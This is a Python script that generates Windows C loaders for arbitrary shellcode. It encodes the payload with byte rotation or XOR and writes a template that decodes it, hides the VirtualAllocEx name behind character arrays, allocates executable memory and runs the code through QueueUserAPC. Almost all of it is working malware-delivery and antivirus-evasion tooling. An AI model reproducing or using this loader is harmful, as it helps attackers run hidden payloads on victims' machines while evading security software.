#!/usr/bin/python

import sys
import os
from termcolor import colored


def rot_compailed(shellcode_size, shellcode):
    load = '''
        #include <stdio.h>
        #include <windows.h>
        #include <string.h>
        
        int main(int argc, char* argv[]) {
                               
            char default_shell[] ;
              
            char* shellcode;
            int shellcode_size = 0;
            
            for (int i = 0; i < sizeof default_shell; i++)
            {
                default_shell[i] = default_shell[i] - 13;
            }
            
            shellcode = default_shell;
            shellcode_size = sizeof(default_shell);
        
        
            char* testString3 = ((char[]){'V','i','r','t','u','a','l','A','l','l','o','c','E','x','\0'});
            char* testString4 = ((char[]){'k','e','r','n','e','l','3','2','\0'});
            HANDLE hthread = OpenThread(16, 0, GetCurrentThreadId());
            FARPROC Allocate = GetProcAddress(GetModuleHandle(testString4), testString3);
            char* buffer = (char*)Allocate(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            CopyMemory(buffer, shellcode, shellcode_size);
            QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);
        
            SleepEx(5, 3);
        }
    '''

    loads = load.replace('default_shell[]', shellcode, 1)
    with open('/root/shellcode.c', 'w+') as f:
        f.write(loads)


def xor_compailed(shellcode_size, shellcode):
    load = '''
        #include <stdio.h>
        #include <windows.h>
        #include <string.h>
        
        int main(int argc, char* argv[]) {
                               
            char default_shell[] ;
              
            char* shellcode;
            int shellcode_size = 0;
            
            for (int i = 0; i < sizeof default_shell; i++)
            {
                default_shell[i] = default_shell[i] ^ 0x0F ^ 0x05 ^ 0x0D ^ 0x02;
            }
            
            shellcode = default_shell;
            shellcode_size = sizeof(default_shell);
        
        
            char* testString3 = ((char[]){'V','i','r','t','u','a','l','A','l','l','o','c','E','x','\0'});
            char* testString4 = ((char[]){'k','e','r','n','e','l','3','2','\0'});
            HANDLE hthread = OpenThread(16, 0, GetCurrentThreadId());
            FARPROC Allocate = GetProcAddress(GetModuleHandle(testString4), testString3);
            char* buffer = (char*)Allocate(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            CopyMemory(buffer, shellcode, shellcode_size);
            QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);
        
            SleepEx(5, 3);
        }
    '''

    loads = load.replace('default_shell[]', shellcode, 1)
    with open('/root/shellcode.c', 'w+') as f:
        f.write(loads)


def Queue_rot_13():
    shellcode_add = input("\033[4mPlease input Shellcode:\033[0m" + colored(" >>", "green"))
    shellcode = ''
    shellcode_size = 0
    try:
        with open(shellcode_add, 'rb') as f:
            while True:
                code = f.read(1)
                if not code:
                    break
                base10 = ord(code) + 0x0D
                code_hex = hex(base10)
                code_hex = code_hex.replace('0x', '')

                if (len(code_hex) == 1):
                    code_hex = '0' + code_hex
                shellcode += r'\x' + code_hex
                shellcode_size += 1
        f.close()
    except Exception as e:
        sys.stderr.writelines(str(e))
    shellcodes = "default_shell[] = \"" + shellcode + "\""
    rot_compailed(shellcode_size, shellcodes)


def Queue_xor_13():
    shellcode_add = input("\033[4mPlease input Shellcode:\033[0m" + colored(" >>", "green"))
    shellcode = ''
    shellcode_size = 0
    try:
        with open(shellcode_add, 'rb') as f:
            while True:
                code = f.read(1)
                if not code:
                    break
                base10 = ord(code) ^ 0x02 ^ 0x0D ^ 0x05 ^ 0x0F
                code_hex = hex(base10)
                code_hex = code_hex.replace('0x', '')

                if (len(code_hex) == 1):
                    code_hex = '0' + code_hex
                shellcode += r'\x' + code_hex
                shellcode_size += 1
        f.close()
    except Exception as e:
        sys.stderr.writelines(str(e))
    shellcodes = "default_shell[] = \"" + shellcode + "\""
    xor_compailed(shellcode_size, shellcodes)